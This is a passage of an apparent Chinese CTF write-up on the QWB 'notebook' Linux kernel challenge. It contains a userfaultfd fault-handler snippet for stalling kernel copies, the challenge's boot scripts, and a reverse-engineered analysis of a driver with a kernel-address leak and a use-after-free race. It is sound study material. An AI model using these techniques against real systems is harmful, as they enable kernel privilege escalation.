<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span>* page; <span class="hljs-comment">/* the data you want to overwrite */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span> <span class="hljs-comment">/* data read from userfaultfd */</span><br>  <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>  <span class="hljs-type">long</span> uffd;        <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>  <span class="hljs-type">ssize_t</span> nread;<br><br>  uffd = (<span class="hljs-type">long</span>)arg;<br><br>  <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd file descriptor */</span><br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span>(nready == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>    <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br>    nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>    <span class="hljs-comment">/* We expect only one king of evenr; verify that assuption */</span><br>    <span class="hljs-keyword">if</span>(msg.event != UFFD_EVENT_PAGEFAULT)&#123;<br>      <span class="hljs-built_in">fprintf</span>(strerr, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* copy things to the addr */</span><br>    <br>    uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>    <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">     * So, round faulting address down to page boundary */</span><br>    uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br><br>    uffdio_copy.len = page_size;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<h3 id="2-题目逆向"><a href="#2-题目逆向" class="headerlink" title="2. 题目逆向"></a>2. 题目逆向</h3><p>首先，启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 -m 64M \<br>        -kernel bzImage \<br>        -initrd rootfs.cpio \<br>        -append <span class="hljs-string">&quot;loglevel=0 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>        -nographic \<br>        -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap \<br>        -monitor /dev/null 2&gt;/dev/null -s \<br>        -no-reboot<br><br></code></pre></td></tr></table></figure>

<ol>
<li>双核双线程</li>
<li>开启kaslr</li>
<li>smep&#x2F;smap开启</li>
<li>kpti开启</li>
</ol>
<p>:disappointed: 很特么绝望，跟uesrland第一次看到保护全开一片绿的感觉，然后我们查看文件系统的init脚本，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>/bin/mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/console<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/ptmx<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/tty<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br><br>ifup eth0 &gt; /dev/null 2&gt;/dev/null<br><br><span class="hljs-built_in">chown</span> root:root /flag<br><span class="hljs-built_in">chmod</span> 600 /flag<br><br>insmod notebook.ko<br><span class="hljs-built_in">cat</span> /proc/modules | grep notebook &gt; /tmp/moduleaddr<br><span class="hljs-built_in">chmod</span> 777 /tmp/moduleaddr<br><span class="hljs-built_in">chmod</span> 777 /dev/notebook<br><span class="hljs-comment">#poweroff -d 300 -f &amp;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to QWB!&quot;</span><br><br><span class="hljs-comment">#sh</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br><br>poweroff -d 1 -n -f<br><br></code></pre></td></tr></table></figure>

<p>发现插入了一个notebook.ko模块，然后我们运行该内核看看基本情况</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ uname -a<br>Linux (none) 4.15.8 #3 SMP Thu Jun 3 01:01:56 PDT 2021 x86_64 GNU/Linux<br>/ $ lsmod<br>Module                  Size  Used by    Tainted: G  <br>notebook               16384  0 <br>/ $ dmesg<br>dmesg: klogctl: Operation not permitted<br></code></pre></td></tr></table></figure>

<p>可以看到令我们欣慰的一点是内核版本还不算很高 :happy:,然后我们打开ida反编译一下notebook.ko看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rodata:0000000000000800                               ; ===========================================================================<br>.rodata:0000000000000800<br>.rodata:0000000000000800                               ; Segment type: Pure data<br>.rodata:0000000000000800                               ; Segment permissions: Read<br>.rodata:0000000000000800                               _rodata segment align_32 public &#x27;CONST&#x27; use64<br>.rodata:0000000000000800                               assume cs:_rodata<br>.rodata:0000000000000800                               ;org 800h<br>.rodata:0000000000000800                               ; const file_operations mynote_fops<br>.rodata:0000000000000800 C0 09 00 00 00 00 00 00 00 00+mynote_fops file_operations &lt;offset __this_module, 0, 0, offset mynote_write, 0, 0, 0, 0, 0, \<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+                                        ; DATA XREF: .data:mynote_dev↓o<br>.rodata:0000000000000800 00 00 00 00 80 00 00 00 00 00+                 offset mynote_ioctl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&gt;<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+_rodata ends<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+<br>__mcount_loc:00000000000008F8                               ; ===========================================================================<br>__mcount_loc:00000000000008F8<br>__mcount_loc:00000000000008F8                               ; Segment type: Pure data<br>__mcount_loc:00000000000008F8                               ; Segment permissions: Read<br>__mcount_loc:00000000000008F8                               __mcount_loc segment qword public &#x27;CONST&#x27; use64<br>__mcount_loc:00000000000008F8                               assume cs:__mcount_loc<br>__mcount_loc:00000000000008F8                               ;org 8F8h<br>__mcount_loc:00000000000008F8 00 00 00 00 00 00 00 00       dq offset mynote_read<br>__mcount_loc:0000000000000900 80 00 00 00 00 00 00 00       dq offset mynote_write<br>__mcount_loc:0000000000000908 10 01 00 00 00 00 00 00       dq offset noteadd<br>__mcount_loc:0000000000000910 00 02 00 00 00 00 00 00       dq offset notedel<br>__mcount_loc:0000000000000918 80 02 00 00 00 00 00 00       dq offset noteedit<br>__mcount_loc:0000000000000920 90 03 00 00 00 00 00 00       dq offset notegift<br>__mcount_loc:0000000000000928 E0 03 00 00 00 00 00 00       dq offset mynote_ioctl<br>__mcount_loc:0000000000000930 74 04 00 00 00 00 00 00       dq offset mynote_init<br>__mcount_loc:0000000000000930                               __mcount_loc ends<br></code></pre></td></tr></table></figure>

<p>一个一个看吧 :bomb:</p>
<h4 id="mynote-init"><a href="#mynote-init" class="headerlink" title="mynote_init"></a>mynote_init</h4><p>本身为加载一个misc设备的初始化函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">mynote_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// ebx</span><br><br>  _fentry__();<br>  v0 = misc_register(&amp;mynote_dev); <span class="hljs-comment">//内核维护一个misc_list链表，misc设备在misc_register注册的时候链接到这个链表</span><br>  _rwlock_init(&amp;lock, <span class="hljs-string">&quot;&amp;lock&quot;</span>, &amp;krealloc); 	<span class="hljs-comment">//初始化一个读写锁</span><br>  printk(<span class="hljs-string">&quot;Welcome to BrokenNotebook!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里涉及到一个Linux中读写锁rwlock的概念</p>
<p>rwlock 主要有以下几种特征：</p>
<ul>
<li>多进程对临界区的读不互斥，可同步进行，互不影响</li>
<li>如果要执行写，需要等所有的读者退出才能执行写操作</li>
<li>如果正在执行写操作且未完成，这一阶段发生的读操作会被阻塞，即读写互斥</li>
<li>如果正在执行写操作且未完成，这一阶段发生的读操作会被阻塞，即写写互斥</li>
<li>不造成睡眠，等待形式是自旋</li>
</ul>
<p>这种场景有点像行人过马路，公交车司机必须停在斑马线前等待所有行人过完马路才能继续往前开，在繁忙的时段，不断地有行人走过，就会导致公交车一直止步不前，甚至造成堵车。</p>
<p>这也是 rwlock 的一大缺点：写者优先级太低，在极端情况下甚至出现饿死的情况，也即是说该锁是一个读优先锁</p>
<h4 id="mynote-exit"><a href="#mynote-exit" class="headerlink" title="mynote_exit"></a>mynote_exit</h4><p>撤销该驱动时的退出函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">mynote_exit</span><span class="hljs-params">()</span><br>&#123;<br>  note *v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rdi</span><br><br>  v0 = notebook;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    note = v0-&gt;note;<br>    ++v0;<br>    kfree(note);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v0 != &amp;notebook[<span class="hljs-number">16</span>] );<br>  misc_deregister(&amp;mynote_dev);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="mynote-ioctl"><a href="#mynote-ioctl" class="headerlink" title="mynote_ioctl"></a>mynote_ioctl</h4><p>覆盖了ioctl函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">mynote_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rdx</span><br>  userarg notearg; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br><br>  _fentry__(file, cmd, arg);<br>  copy_from_user(&amp;notearg, v3, <span class="hljs-number">24LL</span>);<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x100</span> )<br>    <span class="hljs-keyword">return</span> noteadd(notearg.idx, notearg.size, notearg.buf);<br>  <span class="hljs-keyword">if</span> ( cmd &lt;= <span class="hljs-number">0x100</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x64</span> )<br>      <span class="hljs-keyword">return</span> notegift(notearg.buf);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x200</span> )<br>      <span class="hljs-keyword">return</span> notedel(notearg.idx);<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x300</span> )<br>      <span class="hljs-keyword">return</span> noteedit(notearg.idx, notearg.size, notearg.buf);<br>  &#125;<br>  printk(<span class="hljs-string">&quot;[x] Unknown ioctl cmd!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-100LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们得以知道在调用ioctl函数时，首先需要传递一个大小为24字节的数据结构，然后将其复制到上面的<code>notearg</code>当中，然后存在下面几个选项</p>
<table>
<thead>
<tr>
<th align="center">notearg(0x18)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">idx(0x8)</td>
</tr>
<tr>
<td align="center">size(0x8)</td>
</tr>
<tr>
<td align="center">buf(0x8)</td>
</tr>
</tbody></table>
<ol>
<li>0x100:以<code>notearg</code>为参数，调用<code>noteadd</code>,也就是添加notebook；</li>
<li>0x64:调用<code>notegift</code>， 泄露notebook数组内容,  该notebook就是note数据结构作为元素的数组，里面包含了一系列内核地址，也就是说kaslr不值一提😊</li>
<li>0x200:调用<code>notedel</code>， 根据idx来删除对应内核堆块，<del>以及notebook相应的idx中的size来确定是否置空指针来置空指针</del>，这里是因为其size在del的时候不可为0，即使使用noteedit</li>
<li>0x300:以<code>notearg</code>为参数，调用<code>noteedit</code>，用来修改notebook单元中的size（不可为0）和note字段</li>
</ol>
<p>这里我们还有一个notebook的数据结构</p>
<table>
<thead>
<tr>
<th align="center">note</th>
</tr>
</thead>
<tbody><tr>
<td align="center">note</td>
</tr>
<tr>
<td align="center">size</td>
</tr>
</tbody></table>
<h4 id="noteadd-read-lock"><a href="#noteadd-read-lock" class="headerlink" title="noteadd(read_lock)"></a>noteadd(read_lock)</h4><p>使用我们传入的userarg结构体,其中要求idx不能大于0xF,以及size不能大于0x60，还有就是本身的note指针不能有值，不然都会直接返回</p>
<p>若上述条件均满足，我们就可以将我们userarg中的buf参数值传递给内核bss段上的name了，注意这里并不是note的值，此时内核就会使用kmalloc(size, _<em>GFP</em>*)来申请一个object给我们notebook对应下标的note值，这里使用了读锁，但并没太大关系</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">noteadd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  __int64 content_0; <span class="hljs-comment">// rdx</span><br>  __int64 content_1; <span class="hljs-comment">// r13</span><br>  note *note_addr; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> orig_size; <span class="hljs-comment">// r14</span><br>  __int64 ret_value; <span class="hljs-comment">// rbx</span><br><br>  (_fentry__)(idx, size, buf);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0xF</span> ) 		<span class="hljs-comment">//idx最大0xF</span><br>  &#123;<br>    ret_value = <span class="hljs-number">-1LL</span>;<br>    printk(<span class="hljs-string">&quot;[x] Add idx out of range.\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    content_1 = content_0;<br>    note_addr = &amp;notebook[idx]; 	<span class="hljs-comment">//notebook为bss段上的值，这里是取相应idx对应的地址</span><br>    raw_read_lock(&amp;lock);<br>    orig_size = note_addr-&gt;size; 	<span class="hljs-comment">//取本来地址块的size位，用来进行可能的还原</span><br>    note_addr-&gt;size = size; 	<span class="hljs-comment">//填入我们传入的size</span><br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x60</span> ) 	<span class="hljs-comment">//如果说size大于0x60，则进行还原size</span><br>    &#123;<br>      note_addr-&gt;size = orig_size;<br>      ret_value = <span class="hljs-number">-2LL</span>;<br>      printk(<span class="hljs-string">&quot;[x] Add size out of range.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> 		<br>    &#123;<br>      copy_from_user(name, content_1, <span class="hljs-number">256LL</span>); 	<span class="hljs-comment">//该name也是一个bss上的值，此时将我们的传递的notearg.buf传递给他</span><br>      <span class="hljs-keyword">if</span> ( note_addr-&gt;note ) 	<span class="hljs-comment">//若本身存在note，依然还原size</span><br>      &#123;<br>        note_addr-&gt;size = orig_size;<br>        ret_value = <span class="hljs-number">-3LL</span>;<br>        printk(<span class="hljs-string">&quot;[x] Add idx is not empty.\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        note_addr-&gt;note = _kmalloc(size, <span class="hljs-number">0x24000C0</span>LL); 	<span class="hljs-comment">//内核分配块</span><br>        printk(<span class="hljs-string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);<br>        ret_value = <span class="hljs-number">0LL</span>;<br>      &#125;<br>    &#125;<br>    raw_read_unlock(&amp;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ret_value;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="notegift"><a href="#notegift" class="headerlink" title="notegift"></a>notegift</h4><p>该法会将notebook的内容传递给我们的userarg.buf，出题人很温柔:hibiscus:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">notegift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  _fentry__(buf);<br>  printk(<span class="hljs-string">&quot;[*] The notebook needs to be written from beginning to end.\n&quot;</span>);<br>  copy_to_user(buf, notebook, <span class="hljs-number">256LL</span>); 	<span class="hljs-comment">//传递内核地址给用户奥，太棒了</span><br>  printk(<span class="hljs-string">&quot;[*] For this special year, I give you a gift!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">100LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="notedel-write-lock"><a href="#notedel-write-lock" class="headerlink" title="notedel(write_lock)"></a>notedel(write_lock)</h4><p>通过给定的idx来删除堆块，这里我们看到，首先是一个加了一个写锁，很难绷，然后获取相应idx的note后，调用kfree，挂在kmem_cache上？然后根据size来判断是否将对应位清0，但是按照正常单线程的话这个值不会为0的，即使调用noteedit也不会出现这种情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">notedel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>  note *v1; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(idx);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Delete idx out of range.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    raw_write_lock(&amp;lock);<br>    v1 = &amp;notebook[idx];<br>    kfree(v1-&gt;note);<br>    <span class="hljs-keyword">if</span> ( v1-&gt;size ) 		<span class="hljs-comment">//v1-&gt;size不为0才会清空</span><br>    &#123;<br>      v1-&gt;size = <span class="hljs-number">0LL</span>;<br>      v1-&gt;note = <span class="hljs-number">0LL</span>; 			<br>    &#125;<br>    raw_write_unlock(&amp;lock);<br>    printk(<span class="hljs-string">&quot;[-] Delete success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="mynote-read"><a href="#mynote-read" class="headerlink" title="mynote_read"></a>mynote_read</h4><p>读notebook的内容奥，这时我们将读取我们rdx参数指向的对应note至我们的buf那儿</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">mynote_read</span><span class="hljs-params">(file *file, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> idx, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// r13</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(file, buf, idx);<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Read idx out of range.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = v4;<br>    size = notebook[v5].size;<br>    note = notebook[v5].note;<br>    _check_object_size(note, size, <span class="hljs-number">1LL</span>);<br>    copy_to_user(buf, note, size);<br>    printk(<span class="hljs-string">&quot;[*] Read success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="mynote-write"><a href="#mynote-write" class="headerlink" title="mynote_write"></a>mynote_write</h4><p>可以看到，这里我们才是真正的写入了note结构体中的note字段，即使在addnote的时候我们也并没有在其中赋值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">mynote_write</span><span class="hljs-params">(file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> idx, <span class="hljs-type">loff_t</span> 